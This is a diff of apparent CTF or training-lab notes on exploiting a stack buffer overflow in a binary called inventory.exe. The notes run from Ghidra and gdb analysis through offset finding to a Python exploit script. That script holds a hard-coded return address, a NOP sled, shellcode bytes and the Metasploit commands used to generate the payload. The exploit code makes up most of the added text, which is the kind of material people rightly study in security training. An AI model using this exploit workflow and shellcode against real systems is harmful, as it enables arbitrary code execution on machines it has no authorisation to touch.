@@ -35,14 +35,62 @@ Linux--------------------------------------
   
   Through Windows OP station open CTF website and download file to computer and run:
    scp inventory.exe student@192.168.65.20:
+  Drag the inventory.exe file into Ghidra and string search
+  Find the string of "Press enter to view invetory"
+  found the value of fgets (local_4c) === 68  <--(max number)
+  vi demo_helpme.py
+  #!/usr/bin/env pyhton
+  buffer = "A" * 70
+  eip = "BBBB"
+  print (buffer+eip)
+  (Run this script now for finding the eip location)
+  Go to wiremask.eu and input inforamtion
+  Run new buffer 
+  Find the eip location and exact amount needed for buffer
+
+  Script:---------------------
+  #!/usr/bin/env python
+
+  #0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
+  #0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
+  #0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
+  #0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
+
+  buffer = "A" * 76
+  eip = "\x59\x3b\xde\xf7"
+  #buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+  nop = "\x90" * 15
+  buf =  b""
+  buf += b"\xb8\xdd\xaa\xe5\x61\xda\xc5\xd9\x74\x24\xf4\x5d"
+  buf += b"\x33\xc9\xb1\x0b\x83\xc5\x04\x31\x45\x10\x03\x45"
+  buf += b"\x10\x3f\x5f\x8f\x6a\xe7\x39\x02\x0b\x7f\x17\xc0"
+  buf += b"\x5a\x98\x0f\x29\x2e\x0e\xd0\x5d\xff\xac\xb9\xf3"
+  buf += b"\x76\xd3\x68\xe4\x8e\x13\x8d\xf4\xe7\x7b\xe2\x95"
+  buf += b"\x6a\x12\xfc\x02\x26\x6d\x1d\x61\x48"
+  print(buffer+eip+nop+buf)
+
+
+
+  msfconsole
+  use payload/linux/x86/exec
+  show options
+  set CMD whoami
+  generate -b '\x00' -f python    <----- (Copy the payload into script)
+  run ./inventory.exe <<<$(very_cool.py)
+  If the script dosen't work then generate script again with ----->    generate -b '\x00' -f python
+
+  chmod 600 demo_helpme.py
    
   Terminals
   ./inventory.exe
-  gdb inventory.exe
+  gdb ./inventory.exe
   info functions
   pdisass main
-  pdisass getTheGoods
+  pdisass getTheGoods     (Red means broken)
   run                    --(make sure to exceed character limit)--
+
+  
+	
 Windows--------------------------
   In windows op station powershell
   .\SysinternalsSuite\strings.exe .\essfunc.dll     --(Look for strings indicatinf system)
